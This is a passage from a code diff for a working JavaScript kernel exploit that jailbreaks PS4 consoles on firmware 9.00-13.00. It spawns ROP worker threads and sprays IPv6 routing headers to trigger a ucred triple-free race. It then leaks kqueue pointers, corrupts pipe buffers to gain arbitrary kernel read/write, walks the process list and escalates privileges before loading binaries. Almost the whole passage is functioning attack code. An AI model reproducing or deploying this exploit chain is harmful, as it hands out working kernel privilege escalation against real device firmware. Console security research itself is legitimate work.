+                var i, _i, _i2;
+                var _ready, _done, _signal_buf, _pipe_, _pipe_2, _ret, _worker;
+                var _ready2, _done2, _signal_buf2, _pipe_3, _pipe_4, _ret2, _worker2;
+                var _ready3, _done3, _signal_buf3, _pipe_5, _pipe_6, _ret3, _worker3;
+                var ready, done, signal_buf, pipe_0, pipe_1, ret, worker;
+
+                for (i = 0; i < IOV_THREAD_NUM; i++) {
+                    _ready = iov_thread_ready.add(8 * i);
+                    _done = iov_thread_done.add(8 * i);
+                    _signal_buf = iov_signal_buf.add(8 * i);
+
+                    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+                    _pipe_ = read32(sock_buf);
+                    _pipe_2 = read32(sock_buf.add(4));
+
+                    _ret = iov_recvmsg_worker_rop(_ready, new BigInt(0,_pipe_), _done, _signal_buf);
+                    _worker = {
+                        rop: _ret.rop,
+                        loop_size: _ret.loop_size,
+                        pipe_0: _pipe_,
+                        pipe_1: _pipe_2,
+                        ready: _ready,
+                        done: _done,
+                        signal_buf: _signal_buf
+                    };
+                    iov_recvmsg_workers[i] = _worker;
+                }
+                for (_i = 0; _i < UIO_THREAD_NUM; _i++) {
+                    _ready2 = uio_readv_thread_ready.add(8 * _i);
+                    _done2 = uio_readv_thread_done.add(8 * _i);
+                    _signal_buf2 = uio_readv_signal_buf.add(8 * _i);
+
+                    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+                    _pipe_3 = read32(sock_buf);
+                    _pipe_4 = read32(sock_buf.add(4));
+
+                    _ret2 = uio_readv_worker_rop(_ready2, new BigInt(0,_pipe_3), _done2, _signal_buf2);
+                    _worker2 = {
+                        rop: _ret2.rop,
+                        loop_size: _ret2.loop_size,
+                        pipe_0: _pipe_3,
+                        pipe_1: _pipe_4,
+                        ready: _ready2,
+                        done: _done2,
+                        signal_buf: _signal_buf2
+                    };
+                    uio_readv_workers[_i] = _worker2;
+                }
+                for (_i2 = 0; _i2 < UIO_THREAD_NUM; _i2++) {
+                    _ready3 = uio_writev_thread_ready.add(8 * _i2);
+                    _done3 = uio_writev_thread_done.add(8 * _i2);
+                    _signal_buf3 = uio_writev_signal_buf.add(8 * _i2);
+
+                    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+                    _pipe_5 = read32(sock_buf);
+                    _pipe_6 = read32(sock_buf.add(4));
+
+                    _ret3 = uio_writev_worker_rop(_ready3, new BigInt(0,_pipe_5), _done3, _signal_buf3);
+                    _worker3 = {
+                        rop: _ret3.rop,
+                        loop_size: _ret3.loop_size,
+                        pipe_0: _pipe_5,
+                        pipe_1: _pipe_6,
+                        ready: _ready3,
+                        done: _done3,
+                        signal_buf: _signal_buf3
+                    };
+                    uio_writev_workers[_i2] = _worker3;
+                }
+
+                ready = spray_ipv6_ready;
+                done = spray_ipv6_done;
+                signal_buf = spray_ipv6_signal_buf;
+
+                socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+                pipe_0 = read32(sock_buf);
+                pipe_1 = read32(sock_buf.add(4));
+                ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(0,pipe_0), done, signal_buf);
+                worker = {
+                    rop: ret.rop,
+                    loop_size: ret.loop_size,
+                    pipe_0: pipe_0,
+                    pipe_1: pipe_1,
+                    ready: ready,
+                    done: done,
+                    signal_buf: signal_buf
+                };
+                spray_ipv6_worker = worker;
+            }
+
+            function init_workers() {
+                init_threading();
+                var worker, ret, i, _i3, _i4;
+                var thread_id, _thread_id, _thread_id2;
+
+                for (i = 0; i < IOV_THREAD_NUM; i++) {
+                    worker = iov_recvmsg_workers[i];
+                    ret = spawn_thread(worker.rop, worker.loop_size);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
+                    }
+                    thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
+                    worker.thread_id = thread_id;
+                }
+                for (_i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
+                    worker = uio_readv_workers[_i3];
+                    ret = spawn_thread(worker.rop, worker.loop_size);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error('Could not spawn uio_readv_workers[' + _i3 + ']');
+                    }
+                    _thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
+                    worker.thread_id = _thread_id;
+                }
+                for (_i4 = 0; _i4 < UIO_THREAD_NUM; _i4++) {
+                    worker = uio_writev_workers[_i4];
+                    ret = spawn_thread(worker.rop, worker.loop_size);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error('Could not spawn uio_writev_workers[' + _i4 + ']');
+                    }
+                    _thread_id2 = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
+                    worker.thread_id = _thread_id2;
                 }
             }
-        }
 
-        function trigger_ucred_triplefree() {
-            var end = false;
-            write64(msgIov.add(0x0), 1);
-            write64(msgIov.add(0x8), 1);
+            function nanosleep_fun(nsec) {
+                write64(nanosleep_timespec, Math.floor(nsec / 1e9));
+                write64(nanosleep_timespec.add(8), nsec % 1e9);
+                nanosleep(nanosleep_timespec);
+            }
 
-            var main_count = 0;
+            function wait_for(addr, threshold) {
+                while (!read64(addr).eq(threshold)) {
+                    nanosleep_fun(1);
+                }
+            }
 
-            while (!end && main_count < TRIPLEFREE_ITERATIONS) {
-                main_count++;
+            function trigger_iov_recvmsg() {
+                var worker, i, ret;
+                for (i = 0; i < IOV_THREAD_NUM; i++) {
+                    worker = iov_recvmsg_workers[i];
+                    write64(worker.done, 0);
+                }
+                for (i = 0; i < IOV_THREAD_NUM; i++) {
+                    worker = iov_recvmsg_workers[i];
+                    ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']');
+                    }
+                }
+            }
 
-                var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-                write32(nc_set_buf, Number(dummy_socket.lo));
-                netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-                close(dummy_socket);
-                setuid(1);
-                uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0).lo);
-                setuid(1);
-                write32(nc_clear_buf, uaf_socket);
-                netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+            function wait_iov_recvmsg() {
+                var worker, i;
+                for (i = 0; i < IOV_THREAD_NUM; i++) {
+                    worker = iov_recvmsg_workers[i];
+                    wait_for(worker.done, new BigInt(0,1));
+                }
+            }
+
+            function trigger_ipv6_spray_and_read() {
+                write64(spray_ipv6_worker.done, 0);
+                var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
+                if (ret.eq(BigInt_Error)) {
+                    throw new Error('Could not spray_ipv6_worker');
+                }
+                var thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
+                spray_ipv6_worker.thread_id = thread_id;
+                ret = write(new BigInt(0,spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
+                if (ret.eq(BigInt_Error)) {
+                    throw new Error("Could not signal 'run' spray_ipv6_worker");
+                }
+            }
+
+            function wait_ipv6_spray_and_read() {
+                wait_for(spray_ipv6_worker.done, new BigInt(0,1));
+            }
+
+            function trigger_uio_readv() {
+                var worker, i, ret;
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_readv_workers[i];
+                    write64(worker.done, 0);
+                }
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_readv_workers[i];
+                    ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error("Could not signal 'run' uio_readv_workers[" + i + ']');
+                    }
+                }
+            }
+
+            function wait_uio_readv() {
+                var worker, i;
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_readv_workers[i];
+                    wait_for(worker.done, new BigInt(0,1));
+                }
+            }
+
+            function trigger_uio_writev() {
+                var worker, i, ret;
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_writev_workers[i];
+                    write64(worker.done, 0);
+                }
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_writev_workers[i];
+                    ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                    if (ret.eq(BigInt_Error)) {
+                        throw new Error("Could not signal 'run' uio_writev_workers[" + i + ']');
+                    }
+                }
+            }
+
+            function wait_uio_writev() {
+                var worker, i;
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    worker = uio_writev_workers[i];
+                    wait_for(worker.done, new BigInt(0,1));
+                }
+            }
+
+            function init() {
+                log('=== PS4 NetCtrl Jailbreak ===');
+                log('build: 1d6e4fb250b8d7996263a77397f4a72abf0def99');
+                FW_VERSION = get_fwversion();
+                log('Detected PS4 firmware: ' + FW_VERSION);
+                if (FW_VERSION === null) {
+                    log('Failed to detect PS4 firmware version.\nAborting...');
+                    send_notification('Failed to detect PS4 firmware version.\nAborting...');
+                    return false;
+                }
+                var compare_version = function(a, b) {
+                    var a_arr = a.split('.');
+                    var amaj = Number(a_arr[0]);
+                    var amin = Number(a_arr[1]);
+                    var b_arr = b.split('.');
+                    var bmaj = Number(b_arr[0]);
+                    var bmin = Number(b_arr[1]);
+                    return amaj === bmaj ? amin - bmin : amaj - bmaj;
+                };
+                if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
+                    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...');
+                    send_notification('Unsupported PS4 firmware\nAborting...');
+                    return false;
+                }
+                kernel_offset = get_kernel_offset(FW_VERSION);
+                log('Kernel offsets loaded for FW ' + FW_VERSION);
+                return true;
+            }
+
+            var prev_core = -1;
+            var prev_rtprio = -1;
+            var cleanup_called = false;
+
+            function setup() {
+                debug('Preparing netctrl...');
+                prev_core = get_current_core();
+                prev_rtprio = get_rtprio();
+                pin_to_core(MAIN_CORE);
+                set_rtprio(MAIN_RTPRIO);
+                debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
+
+                spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
 
                 var i;
-                for (i = 0; i < 32; i++) {
-                    trigger_iov_recvmsg();
-                    sched_yield();
-                    write(new BigInt(0,iov_sock_1), tmp, 1);
-                    wait_iov_recvmsg();
-                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                for (i = 0; i < IPV6_SOCK_NUM; i++) {
+                    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
+                    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
                 }
 
-                close(dup(new BigInt(0,uaf_socket)));
+                write64(msg.add(0x10), msgIov);
+                write64(msg.add(0x18), MSG_IOV_NUM);
 
-                end = find_twins();
-                if (!end) {
-                    if (cleanup_called) {
-                        throw new Error('Netctrl failed - Reboot and try again');
+                var dummyBuffer = malloc(0x1000);
+                fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
+                write64(uioIovRead.add(0x00), dummyBuffer);
+                write64(uioIovWrite.add(0x00), dummyBuffer);
+
+                socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
+                uio_sock_0 = read32(uio_sock);
+                uio_sock_1 = read32(uio_sock.add(4));
+
+                socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
+                iov_sock_0 = read32(iov_sock);
+                iov_sock_1 = read32(iov_sock.add(4));
+
+                for (i = 0; i < ipv6_socks.length; i++) {
+                    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+                }
+
+                free_rthdrs(ipv6_socks);
+
+                pipe(pipe_sock);
+                master_pipe[0] = read32(pipe_sock);
+                master_pipe[1] = read32(pipe_sock.add(4));
+                pipe(pipe_sock);
+                victim_pipe[0] = read32(pipe_sock);
+                victim_pipe[1] = read32(pipe_sock.add(4));
+                masterRpipeFd = master_pipe[0];
+                masterWpipeFd = master_pipe[1];
+                victimRpipeFd = victim_pipe[0];
+                victimWpipeFd = victim_pipe[1];
+                fcntl(new BigInt(0,masterRpipeFd), F_SETFL, O_NONBLOCK);
+                fcntl(new BigInt(0,masterWpipeFd), F_SETFL, O_NONBLOCK);
+                fcntl(new BigInt(0,victimRpipeFd), F_SETFL, O_NONBLOCK);
+                fcntl(new BigInt(0,victimWpipeFd), F_SETFL, O_NONBLOCK);
+
+                create_workers();
+                init_workers();
+                debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
+            }
+
+            function cleanup(kill_workers) {
+                if (kill_workers === undefined) kill_workers = false;
+                if (cleanup_called) return;
+                cleanup_called = true;
+                debug('Cleaning up...');
+                var i, _i9, _i0, _i1, worker;
+
+                for (i = 0; i < ipv6_socks.length; i++) {
+                    close(ipv6_socks[i]);
+                }
+
+                for (_i9 = 0; _i9 < IOV_THREAD_NUM; _i9++) {
+                    worker = iov_recvmsg_workers[_i9];
+                    if (worker !== undefined) {
+                        write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                        if (kill_workers && worker.thread_id !== undefined) {
+                            thr_kill(new BigInt(0,worker.thread_id), 9);
+                        }
                     }
-                    close(new BigInt(0,uaf_socket));
-                    continue;
                 }
-                log('Triple freeing...');
+                for (_i0 = 0; _i0 < UIO_THREAD_NUM; _i0++) {
+                    worker = uio_readv_workers[_i0];
+                    if (worker !== undefined) {
+                        write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                        if (kill_workers && worker.thread_id !== undefined) {
+                            thr_kill(new BigInt(0,worker.thread_id), 9);
+                        }
+                    }
+                }
+                for (_i1 = 0; _i1 < UIO_THREAD_NUM; _i1++) {
+                    worker = uio_writev_workers[_i1];
+                    if (worker !== undefined) {
+                        write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
+                        if (kill_workers && worker.thread_id !== undefined) {
+                            thr_kill(new BigInt(0,worker.thread_id), 9);
+                        }
+                    }
+                }
+                if (spray_ipv6_worker !== undefined) {
+                    write(new BigInt(0,spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
+                    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
+                        thr_kill(new BigInt(0,spray_ipv6_worker.thread_id), 9);
+                    }
+                }
 
-                free_rthdr(ipv6_socks[twins[1]]);
+                close(new BigInt(0,uio_sock_1));
+                close(new BigInt(0,uio_sock_0));
+                close(new BigInt(0,iov_sock_1));
+                close(new BigInt(0,iov_sock_0));
+
+                if (prev_core >= 0) {
+                    debug('Restoring to previous core: ' + prev_core);
+                    pin_to_core(prev_core);
+                    prev_core = -1;
+                }
+                set_rtprio(prev_rtprio);
+                debug('Cleanup completed');
+            }
+
+            function fill_buffer_64(buf, val, len) {
+                var i;
+                for (i = 0; i < len; i = i + 8) {
+                    write64(buf.add(i), val);
+                }
+            }
+
+            function find_twins() {
                 var count = 0;
+                var val;
+                var i, j;
+                var zeroMemoryCount = 0;
 
-                while (count < 10000) {
-                    trigger_iov_recvmsg();
-                    sched_yield();
-                    get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-                    if (read32(leak_rthdr) === 1) {
-                        break;
+                var spray_add = spray_rthdr.add(0x04);
+                var lead_add = leak_rthdr.add(0x04);
+                while (count < MAX_ROUNDS_TWIN) {
+                    if (debugging.info.memory.available === 0) {
+                        zeroMemoryCount++;
+                        if (zeroMemoryCount >= 5) {
+                            log('netctrl failed!');
+                            cleanup();
+                            return false;
+                        }
+                    } else {
+                        zeroMemoryCount = 0;
                     }
-                    write(new BigInt(0,iov_sock_1), tmp, 1);
-                    wait_iov_recvmsg();
-                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                    if (count % 10 === 0) {}
+                    for (i = 0; i < ipv6_socks.length; i++) {
+                        write32(spray_add, RTHDR_TAG | i);
+                        set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+                    }
+                    for (i = 0; i < ipv6_socks.length; i++) {
+                        get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+                        val = read32(lead_add);
+                        j = val & 0xFFFF;
+                        if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
+                            twins[0] = i;
+                            twins[1] = j;
+                            log('Twins found: [' + i + '] [' + j + ']');
+                            return true;
+                        }
+                    }
                     count++;
                 }
-                if (count === 1000) {
-                    log('Dropped out from reclaim loop');
-                    close(new BigInt(0,uaf_socket));
-                    continue;
-                }
-                triplets[0] = twins[0];
-
-                close(dup(new BigInt(0,uaf_socket)));
-
-                triplets[1] = find_triplet(triplets[0], -1);
-
-                if (triplets[1] === -1) {
-                    log("Couldn't find triplet 1");
-                    write(new BigInt(0,iov_sock_1), tmp, 1);
-                    close(new BigInt(0,uaf_socket));
-                    end = false;
-                    continue;
-                }
-
-                write(new BigInt(0,iov_sock_1), tmp, 1);
-
-                triplets[2] = find_triplet(triplets[0], triplets[1]);
-
-                if (triplets[2] === -1) {
-                    log("Couldn't find triplet 2");
-                    close(new BigInt(0,uaf_socket));
-                    end = false;
-                    continue;
-                }
-
-                wait_iov_recvmsg();
-                read(new BigInt(0,iov_sock_0), tmp, 1);
-            }
-            if (main_count === TRIPLEFREE_ITERATIONS) {
-                log('Failed to Triple Free');
-                return false;
-            }
-            return true;
-        }
-
-        function leak_kqueue() {
-            debug('Leaking kqueue...');
-
-            free_rthdr(ipv6_socks[triplets[1]]);
-
-            var kq = new BigInt(0,0);
-            var magic_val = new BigInt(0x0, 0x1430000);
-            var magic_add = leak_rthdr.add(0x08);
-            var count = 0;
-            while (count < KQUEUE_ITERATIONS) {
-                kq = kqueue();
-                get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
-                if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
-                    break;
-                }
-                close(kq);
-                sched_yield();
-                count++;
-            }
-            if (count === KQUEUE_ITERATIONS) {
-                log('Failed to leak kqueue_fdp');
+                log('find_twins failed');
                 return false;
             }
 
-            kl_lock = read64(leak_rthdr.add(0x60));
-            kq_fdp = read64(leak_rthdr.add(0x98));
-            if (kq_fdp.eq(0)) {
-                log('Failed to leak kqueue_fdp');
-                return false;
-            }
-            debug('kq_fdp: ' + kq_fdp.toString() + ' kl_lock: ' + kl_lock.toString());
+            function find_triplet(master, other, iterations) {
+                if (typeof iterations === 'undefined') {
+                    iterations = MAX_ROUNDS_TRIPLET;
+                }
+                var count = 0;
+                var val;
+                var i, j;
 
-            close(kq);
-
-            triplets[1] = find_triplet(triplets[0], triplets[2]);
-            return true;
-        }
-
-        function kreadslow64(address) {
-            var buffer = kreadslow(address, 8);
-            if (buffer.eq(BigInt_Error)) {
-                cleanup();
-                throw new Error('Netctrl failed - Reboot and try again');
-            }
-            return read64(buffer);
-        }
-
-        function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-            write64(uio.add(0x00), uio_iov);
-            write64(uio.add(0x08), UIO_IOV_NUM);
-            write64(uio.add(0x10), BigInt_Error);
-            write64(uio.add(0x18), size);
-            write32(uio.add(0x20), UIO_SYSSPACE);
-            write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ);
-            write64(uio.add(0x28), uio_td);
-            write64(uio.add(0x30), addr);
-            write64(uio.add(0x38), size);
-        }
-
-        function kreadslow(addr, size) {
-            debug('Enter kreadslow addr: ' + addr.toString() + ' size : ' + size);
-
-            if (debugging.info.memory.available === 0) {
-                log('kreadslow - Memory exhausted before start');
-                cleanup();
-                return BigInt_Error;
-            }
-            debug('kreadslow - Preparing buffers...');
-
-            var leak_buffers = new Array(UIO_THREAD_NUM);
-            var i, _i12, _i13, count, zeroMemoryCount, count2, zeroMemoryCount2, uio_iov, val, leak_buffer, tag_val, retry;
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                leak_buffers[i] = malloc(size);
-            }
-
-            write32(sockopt_val_buf, size);
-            setsockopt(new BigInt(0,uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
-
-            write(new BigInt(0,uio_sock_1), tmp, size);
-
-            write64(uioIovRead.add(0x08), size);
-            debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
-
-            free_rthdr(ipv6_socks[triplets[1]]);
-
-            var uio_leak_add = leak_rthdr.add(0x08);
-            debug('kreadslow - Starting uio reclaim loop...');
-            count = 0;
-            zeroMemoryCount = 0;
-            while (count < 10000) {
-                if (debugging.info.memory.available === 0) {
-                    zeroMemoryCount++;
-                    if (zeroMemoryCount >= 5) {
-                        log('netctrl failed!');
-                        cleanup();
-                        return BigInt_Error;
+                var spray_add = spray_rthdr.add(0x04);
+                var leak_add = leak_rthdr.add(0x04);
+                while (count < iterations) {
+                    if (count % 100 === 0) {}
+                    for (i = 0; i < ipv6_socks.length; i++) {
+                        if (i === master || i === other) {
+                            continue;
+                        }
+                        write32(spray_add, RTHDR_TAG | i);
+                        set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
                     }
-                } else {
-                    zeroMemoryCount = 0;
+                    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+                    val = read32(leak_add);
+                    j = val & 0xFFFF;
+                    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
+                        return j;
+                    }
+                    count++;
                 }
-                count++;
-                if (count % 100 === 1) {
-                    debug('kreadslow - uio loop iter ' + count);
-                }
-                trigger_uio_writev();
-                sched_yield();
+                return -1;
+            }
 
-                get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
-                if (read32(uio_leak_add) === UIO_IOV_NUM) {
-                    break;
+            function init_threading() {
+                var jmpbuf = malloc(0x60);
+                setjmp(jmpbuf);
+                saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
+                saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
+            }
+
+            var LOG_MAX_LINES = 38;
+            var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
+
+            function setup_log_screen() {}
+
+            function yield_to_render(callback) {
+                var id = jsmaf.setInterval(function() {
+                    jsmaf.clearInterval(id);
+                    try {
+                        callback();
+                    } catch (e) {
+                        log('ERROR: ' + e.message);
+                        cleanup();
+                    }
+                }, 0);
+            }
+
+            var exploit_count = 0;
+            var exploit_end = false;
+
+            function netctrl_exploit() {
+                setup_log_screen();
+                var supported_fw = init();
+                if (!supported_fw) {
+                    return;
+                }
+                log('Setting up exploit...');
+                yield_to_render(exploit_phase_setup);
+            }
+
+            function exploit_phase_setup() {
+                setup();
+                log('Workers spawned');
+                exploit_count = 0;
+                exploit_end = false;
+                yield_to_render(exploit_phase_trigger);
+            }
+
+            function exploit_phase_trigger() {
+                if (exploit_count >= MAIN_LOOP_ITERATIONS) {
+                    log('Failed to acquire kernel R/W');
+                    cleanup();
+                    return;
+                }
+                exploit_count++;
+                log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
+                if (!trigger_ucred_triplefree()) {
+                    yield_to_render(exploit_phase_trigger);
+                    return;
+                }
+                log('Leaking kqueue...');
+                yield_to_render(exploit_phase_leak);
+            }
+
+            function exploit_phase_leak() {
+                if (!leak_kqueue()) {
+                    yield_to_render(exploit_phase_trigger);
+                    return;
+                }
+                log('Setting up arbitrary R/W...');
+                yield_to_render(exploit_phase_rw);
+            }
+
+            function exploit_phase_rw() {
+                setup_arbitrary_rw();
+                log('Jailbreaking...');
+                yield_to_render(exploit_phase_jailbreak);
+            }
+
+            function exploit_phase_jailbreak() {
+                jailbreak();
+            }
+
+            function setup_arbitrary_rw() {
+                var fd_files = kreadslow64(kq_fdp);
+                fdt_ofiles = fd_files.add(0x00);
+                debug('fdt_ofiles: ' + fdt_ofiles.toString());
+                master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+                debug('master_r_pipe_file: ' + master_r_pipe_file.toString());
+                victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+                debug('victim_r_pipe_file: ' + victim_r_pipe_file.toString());
+                master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
+                debug('master_r_pipe_data: ' + master_r_pipe_data.toString());
+                victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
+                debug('victim_r_pipe_data: ' + victim_r_pipe_data.toString());
+
+                write32(master_pipe_buf.add(0x00), 0);
+                write32(master_pipe_buf.add(0x04), 0);
+                write32(master_pipe_buf.add(0x08), 0);
+                write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
+                write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
+
+                var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
+                if (ret_write.eq(BigInt_Error)) {
+                    cleanup();
+                    throw new Error('Netctrl failed - Reboot and try again');
                 }
 
-                read(new BigInt(0,uio_sock_0), tmp, size);
-                for (_i12 = 0; _i12 < UIO_THREAD_NUM; _i12++) {
-                    read(new BigInt(0,uio_sock_0), leak_buffers[_i12], size);
+                fhold(fget(master_pipe[0]));
+                fhold(fget(master_pipe[1]));
+                fhold(fget(victim_pipe[0]));
+                fhold(fget(victim_pipe[1]));
+
+                remove_rthr_from_socket(ipv6_socks[triplets[0]]);
+                remove_rthr_from_socket(ipv6_socks[triplets[1]]);
+                remove_rthr_from_socket(ipv6_socks[triplets[2]]);
+
+                remove_uaf_file();
+                var i;
+                for (i = 0; i < 0x20; i = i + 8) {
+                    var readed = kread64(master_r_pipe_data.add(i));
+                    debug('Reading master_r_pipe_data[' + i + '] : ' + readed.toString());
                 }
-                wait_uio_writev();
+                log('Arbitrary R/W achieved');
+                debug('Reading value in victim_r_pipe_file: ' + kread64(victim_r_pipe_file).toString());
+            }
+
+            function find_allproc() {
+                var pipe_0 = master_pipe[0];
+                var pipe_1 = master_pipe[1];
+                debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
+                debug('find_allproc - Getting pid...');
+                var pid = Number(getpid().lo);
+                debug('find_allproc - pid: ' + pid);
+                debug('find_allproc - Writing pid to sockopt_val_buf...');
+                write32(sockopt_val_buf, pid);
+                debug('find_allproc - Calling ioctl FIOSETOWN...');
+                var ioctl_ret = ioctl(new BigInt(0,pipe_0), FIOSETOWN, sockopt_val_buf);
+                debug('find_allproc - ioctl returned: ' + ioctl_ret.toString());
+                debug('find_allproc - Getting fp...');
+                var fp = fget(pipe_0);
+                debug('find_allproc - fp: ' + fp.toString());
+                debug('find_allproc - Reading f_data...');
+                var f_data = kread64(fp.add(0x00));
+                debug('find_allproc - f_data: ' + f_data.toString());
+                debug('find_allproc - Reading pipe_sigio...');
+                var pipe_sigio = kread64(f_data.add(0xd0));
+                debug('find_allproc - pipe_sigio: ' + pipe_sigio.toString());
+                debug('find_allproc - Reading p...');
+                var p = kread64(pipe_sigio);
+                debug('find_allproc - initial p: ' + p.toString());
+                kernel.addr.curproc = p;
+
+                debug('find_allproc - Walking process list...');
+                var walk_count = 0;
+                while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
+                    p = kread64(p.add(0x08));
+                    walk_count++;
+                    if (walk_count % 100 === 0) {
+                        debug('find_allproc - walk_count: ' + walk_count + ' p: ' + p.toString());
+                    }
+                }
+                debug('find_allproc - Found allproc after ' + walk_count + ' iterations');
+                return p;
+            }
+
+            function jailbreak() {
+                debug('jailbreak - Starting...');
+                if (!kernel_offset) {
+                    throw new Error('Kernel offsets not loaded');
+                }
+                if (FW_VERSION === null) {
+                    throw new Error('FW_VERSION is null');
+                }
+                var i;
+                for (i = 0; i < 10; i++) {
+                    sched_yield();
+                }
+                debug('jailbreak - Calling find_allproc...');
+                kernel.addr.allproc = find_allproc();
+                debug('allproc: ' + kernel.addr.allproc.toString());
+
+                kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
+                log('Kernel base: ' + kernel.addr.base.toString());
+                jailbreak_shared(FW_VERSION);
+                log('Jailbreak Complete - JAILBROKEN');
+                utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom');
+                cleanup(false);
+                show_success();
+                run_binloader();
+            }
+
+            function fhold(fp) {
+                kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1);
+            }
+
+            function fget(fd) {
+                return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
+            }
+
+            function remove_rthr_from_socket(fd) {
+                if (fd > 0) {
+                    var fp = fget(fd);
+                    var f_data = kread64(fp.add(0x00));
+                    var so_pcb = kread64(f_data.add(0x18));
+                    var in6p_outputopts = kread64(so_pcb.add(0x118));
+                    kwrite64(in6p_outputopts.add(0x68), new BigInt(0,0));
+                }
+            }
+
+            var victim_pipe_buf = malloc(PIPEBUF_SIZE);
+
+            function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
+                if (buffer.eq(0)) {
+                    throw new Error('buffer cannot be zero');
+                }
+                write32(victim_pipe_buf.add(0x00), cnt);
+                write32(victim_pipe_buf.add(0x04), _in);
+                write32(victim_pipe_buf.add(0x08), out);
+                write32(victim_pipe_buf.add(0x0C), size);
+                write64(victim_pipe_buf.add(0x10), buffer);
+                write(new BigInt(0,masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
+                return read(new BigInt(0,masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
+            }
+
+            function kwrite(dest, src, n) {
